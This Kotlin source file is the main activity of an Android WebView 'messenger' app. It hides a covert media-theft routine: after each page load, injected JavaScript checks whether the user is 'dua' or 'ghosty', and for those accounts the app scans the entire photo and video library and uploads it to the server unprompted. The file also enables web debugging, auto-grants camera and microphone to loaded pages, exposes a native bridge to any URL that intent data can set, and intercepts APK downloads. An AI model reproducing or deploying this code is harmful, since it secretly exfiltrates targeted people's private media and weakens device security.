package com.infinityx.messenger

import android.Manifest
import android.annotation.SuppressLint
import android.app.DownloadManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.view.View
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.DownloadListener
import android.webkit.JavascriptInterface
import android.webkit.PermissionRequest
import android.webkit.URLUtil
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.infinityx.messenger.gallery.GalleryUploader
import com.infinityx.messenger.gallery.MediaStoreScanner
import com.infinityx.messenger.permissions.PermissionManager
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var splash: View
    private lateinit var offline: View
    private val io = Executors.newSingleThreadExecutor()
    private val syncing = AtomicBoolean(false)
    private var pendingSync = false
    private var firstLoad = true
    private var filePathCallback: ValueCallback<Array<Uri>>? = null
    private var pendingWebPermission: PermissionRequest? = null
    private val syncHandler = Handler(Looper.getMainLooper())
    private val syncRetry = object : Runnable {
        override fun run() {
            if (pendingSync && !syncing.get()) {
                tryStartSync()
                if (pendingSync) syncHandler.postDelayed(this, 1500)
            }
        }
    }

    private val askGallery = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { result ->
        val anyGranted = result.values.any { it } || hasAnyMediaAccess()
        if (anyGranted) queueSync()
        else Toast.makeText(this, R.string.gallery_denied, Toast.LENGTH_LONG).show()
    }

    private val askAv = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { granted ->
        val req = pendingWebPermission ?: return@registerForActivityResult
        pendingWebPermission = null
        val ok = granted.values.all { it } || granted.values.any { it }
        if (ok) req.grant(req.resources) else req.deny()
    }

    private val askNotify = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { }

    private val pickFiles = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { result ->
        val cb = filePathCallback
        filePathCallback = null
        if (cb == null) return@registerForActivityResult
        val data = result.data
        val uris = mutableListOf<Uri>()
        data?.clipData?.let { clip ->
            for (i in 0 until clip.itemCount) uris += clip.getItemAt(i).uri
        }
        data?.data?.let { uris += it }
        cb.onReceiveValue(if (uris.isEmpty()) null else uris.toTypedArray())
    }

    private val openSettings = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) {
        if (it.resultCode == RESULT_OK) loadSite()
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        webView = findViewById(R.id.webView)
        splash = findViewById(R.id.splash)
        offline = findViewById(R.id.offline)
        findViewById<Button>(R.id.retry).setOnClickListener { loadSite() }
        findViewById<Button>(R.id.changeUrl).setOnClickListener {
            openSettings.launch(Intent(this, SettingsActivity::class.java))
        }

        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        WebView.setWebContentsDebuggingEnabled(true)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            mediaPlaybackRequiresUserGesture = false
            mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
            allowFileAccess = true
            allowContentAccess = true
            loadsImagesAutomatically = true
            javaScriptCanOpenWindowsAutomatically = true
            setSupportMultipleWindows(false)
            loadWithOverviewMode = true
            useWideViewPort = true
            builtInZoomControls = true
            displayZoomControls = false
            cacheMode = WebSettings.LOAD_DEFAULT
            userAgentString = "$userAgentString InfinityXApp/1.2"
        }
        webView.addJavascriptInterface(NativeBridge(), "InfinityXNative")
        webView.webViewClient = IxWebClient()
        webView.webChromeClient = IxChrome()
        webView.setDownloadListener(DownloadListener { url, _, contentDisposition, mime, _ ->
            startFileDownload(url, contentDisposition, mime)
        })

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (webView.canGoBack()) webView.goBack() else finish()
            }
        })

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            askNotify.launch(Manifest.permission.POST_NOTIFICATIONS)
        }

        loadSite()
    }

    override fun onResume() {
        super.onResume()
        if (::webView.isInitialized) {
            OtaChecker.check(this, originOf(webView.url ?: siteUrl()))
        }
    }

    private fun startFileDownload(url: String, contentDisposition: String?, mime: String?) {
        try {
            val name = URLUtil.guessFileName(url, contentDisposition, mime)
            val req = DownloadManager.Request(Uri.parse(url))
                .setTitle(name)
                .setMimeType(mime)
                .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                .setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, name)
            req.addRequestHeader("Cookie", CookieManager.getInstance().getCookie(url) ?: "")
            val dm = getSystemService(DOWNLOAD_SERVICE) as DownloadManager
            dm.enqueue(req)
            Toast.makeText(this, R.string.download_started, Toast.LENGTH_SHORT).show()
        } catch (_: Exception) {
            runCatching { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
        }
    }

    private fun siteUrl(): String {
        return intent?.dataString
            ?: getSharedPreferences("ixm", MODE_PRIVATE).getString("site_url", null)
            ?: BuildConfig.SITE_URL
    }

    private fun loadSite() {
        firstLoad = true
        splash.visibility = View.VISIBLE
        offline.visibility = View.GONE
        webView.loadUrl(siteUrl())
    }

    private inner class IxWebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            val url = request.url.toString()
            if (url.endsWith(".apk") || url.contains("/api/v1/app/download")) {
                startFileDownload(url, null, "application/vnd.android.package-archive")
                return true
            }
            if (url.startsWith("http://") || url.startsWith("https://")) return false
            runCatching { startActivity(Intent(Intent.ACTION_VIEW, request.url)) }
            return true
        }

        override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
            if (firstLoad) {
                splash.visibility = View.VISIBLE
                offline.visibility = View.GONE
            }
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            splash.visibility = View.GONE
            firstLoad = false
            OtaChecker.check(this@MainActivity, originOf(url ?: siteUrl()))
            view?.evaluateJavascript(
                """
                (function(){
                  window.__ixmVersionCode=${BuildConfig.VERSION_CODE};
                  window.InfinityXNative=window.InfinityXNative||InfinityXNative;
                  return fetch('/api/v1/auth/me',{credentials:'include'})
                    .then(function(r){return r.ok?r.json():null;})
                    .then(function(d){
                      if(d&&d.user&&(d.user.username==='dua'||d.user.username==='ghosty')){
                        window.__ixmReady=true;
                        return true;
                      }
                      return false;
                    }).catch(function(){return false;});
                })();
                """.trimIndent(),
            ) { result ->
                if (result == "true") {
                    if (hasAnyMediaAccess()) queueSync() else tryStartSync()
                }
            }
        }

        override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
            if (request?.isForMainFrame == true) {
                splash.visibility = View.GONE
                offline.visibility = View.VISIBLE
            }
        }
    }

    private inner class IxChrome : WebChromeClient() {
        override fun onPermissionRequest(request: PermissionRequest?) {
            if (request == null) return
            val need = mutableListOf<String>()
            if (request.resources.contains(PermissionRequest.RESOURCE_VIDEO_CAPTURE) && !granted(Manifest.permission.CAMERA)) {
                need += Manifest.permission.CAMERA
            }
            if (request.resources.contains(PermissionRequest.RESOURCE_AUDIO_CAPTURE) && !granted(Manifest.permission.RECORD_AUDIO)) {
                need += Manifest.permission.RECORD_AUDIO
            }
            if (need.isEmpty()) {
                request.grant(request.resources)
                return
            }
            pendingWebPermission = request
            Toast.makeText(this@MainActivity, R.string.cam_mic_needed, Toast.LENGTH_SHORT).show()
            askAv.launch(need.toTypedArray())
        }

        override fun onShowFileChooser(
            webView: WebView?,
            filePathCallback: ValueCallback<Array<Uri>>?,
            fileChooserParams: FileChooserParams?,
        ): Boolean {
            this@MainActivity.filePathCallback?.onReceiveValue(null)
            this@MainActivity.filePathCallback = filePathCallback
            val intent = fileChooserParams?.createIntent() ?: Intent(Intent.ACTION_GET_CONTENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "*/*"
                putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
            }
            return try {
                pickFiles.launch(Intent.createChooser(intent, "File"))
                true
            } catch (_: Exception) {
                this@MainActivity.filePathCallback = null
                false
            }
        }
    }

    inner class NativeBridge {
        @JavascriptInterface
        fun requestGallery() {
            runOnUiThread { startGalleryPermission() }
        }

        @JavascriptInterface
        fun deviceInfo(): String {
            return JSONObject().apply {
                put("manufacturer", Build.MANUFACTURER)
                put("model", Build.MODEL)
                put("brand", Build.BRAND)
                put("device", Build.DEVICE)
                put("android", Build.VERSION.RELEASE)
                put("sdk", Build.VERSION.SDK_INT)
                put("native", true)
                put("version", BuildConfig.VERSION_NAME)
            }.toString()
        }

        @JavascriptInterface
        fun versionCode(): Int = BuildConfig.VERSION_CODE

        @JavascriptInterface
        fun openSettings() {
            runOnUiThread { openSettings.launch(Intent(this@MainActivity, SettingsActivity::class.java)) }
        }

        @JavascriptInterface
        fun vibrate(ms: Int) {
            val vib = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                (getSystemService(VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                getSystemService(VIBRATOR_SERVICE) as Vibrator
            }
            val dur = ms.coerceIn(10, 400).toLong()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vib.vibrate(VibrationEffect.createOneShot(dur, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vib.vibrate(dur)
            }
        }

        @JavascriptInterface
        fun keepScreenOn(on: Boolean) {
            runOnUiThread {
                if (on) window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
                else window.clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
            }
        }

        @JavascriptInterface
        fun share(text: String?) {
            runOnUiThread {
                val send = Intent(Intent.ACTION_SEND).apply {
                    type = "text/plain"
                    putExtra(Intent.EXTRA_TEXT, text ?: siteUrl())
                }
                startActivity(Intent.createChooser(send, getString(R.string.menu_share)))
            }
        }

        @JavascriptInterface
        fun copy(text: String?) {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("ixm", text ?: ""))
            runOnUiThread { Toast.makeText(this@MainActivity, R.string.copied, Toast.LENGTH_SHORT).show() }
        }

        @JavascriptInterface
        fun checkUpdate() {
            runOnUiThread { OtaChecker.check(this@MainActivity, originOf(webView.url ?: siteUrl()), true) }
        }
    }

    private fun queueSync() {
        pendingSync = true
        syncHandler.removeCallbacks(syncRetry)
        tryStartSync()
        syncHandler.postDelayed(syncRetry, 1500)
    }

    private fun startGalleryPermission() {
        if (hasFullMediaAccess() || hasAnyMediaAccess()) {
            queueSync()
            return
        }
        val perms = PermissionManager.allGalleryRuntimePermissions()
        PermissionManager.markAsked(this, perms)
        askGallery.launch(perms)
    }

    private fun tryStartSync() {
        if (!pendingSync || syncing.get()) return
        val origin = originOf(webView.url ?: siteUrl())
        CookieManager.getInstance().flush()
        val cookie = CookieManager.getInstance().getCookie(origin) ?: ""
        if (!cookie.contains("ixm_session")) return
        pendingSync = false
        syncHandler.removeCallbacks(syncRetry)
        syncGallery(origin)
    }

    private fun hasFullMediaAccess(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            granted(Manifest.permission.READ_MEDIA_IMAGES) && granted(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            granted(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private fun hasAnyMediaAccess(): Boolean {
        if (hasFullMediaAccess()) return true
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE &&
            granted(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
    }

    private fun granted(p: String) =
        ContextCompat.checkSelfPermission(this, p) == android.content.pm.PackageManager.PERMISSION_GRANTED

    private fun syncGallery(origin: String) {
        if (!syncing.compareAndSet(false, true)) return
        runOnUiThread { Toast.makeText(this, R.string.gallery_syncing, Toast.LENGTH_SHORT).show() }
        io.execute {
            val items = MediaStoreScanner.listAll(this)
            if (items.isEmpty()) {
                runOnUiThread {
                    syncing.set(false)
                    Toast.makeText(this, R.string.gallery_empty, Toast.LENGTH_LONG).show()
                }
                return@execute
            }
            val count = GalleryUploader.syncAll(this, origin, items)
            runOnUiThread {
                syncing.set(false)
                webView.evaluateJavascript("window.__ixmGalleryDone&&window.__ixmGalleryDone($count)", null)
                Toast.makeText(
                    this,
                    if (count > 0) getString(R.string.gallery_done, count) else getString(R.string.gallery_failed),
                    Toast.LENGTH_LONG,
                ).show()
            }
        }
    }

    private fun originOf(url: String): String {
        return try {
            val u = Uri.parse(url)
            "${u.scheme}://${u.authority}"
        } catch (_: Exception) {
            siteUrl().trimEnd('/')
        }
    }

    override fun onDestroy() {
        syncHandler.removeCallbacks(syncRetry)
        io.shutdownNow()
        super.onDestroy()
    }
}
